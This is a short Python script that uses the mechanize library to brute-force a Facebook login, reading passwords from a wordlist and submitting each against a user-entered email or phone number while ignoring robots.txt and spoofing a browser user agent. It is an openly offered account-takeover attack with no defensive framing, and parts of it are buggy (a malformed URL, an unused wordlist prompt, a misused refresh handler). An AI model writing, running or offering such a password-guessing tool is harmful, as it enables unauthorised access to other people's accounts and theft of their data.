from mechanize import Browser, _http
from bs4 import BeautifulSoup
from http.cookiejar import CookieJar
import http.cookiejar as cookielib
# import CookieJar
import mechanize
# import random


br = Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize, _http.HTTPRefreshProcessor())
# br.set_handle_refresh(False)
headers = [('User-agent', 'Mozilla/5.0 (x11')]
br.addheaders = [('User-agent', 'Mozilla/5.0 (x11')]
wordlist = open("wordlist.txt", "r")

email = str(input(" please Enter your email or phone numbre or id :"))
pass_list = str(input(" your Wordlist : "))


for i in wordlist.readlines():
    i = i.rstrip("\n")
    br.open("https://www.facebook.com/login.php?login_attempt =1")
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = i
    br.submit()
    print(i)
    print(br.geturl())

# data = br.open("https://www.facebook.com/login.php?login_attempt =1").read()
# soup = BeautifulSoup(data , "html.parser")
# for i in soup.findAll("form"):
#     print(i)

# print(br.read())
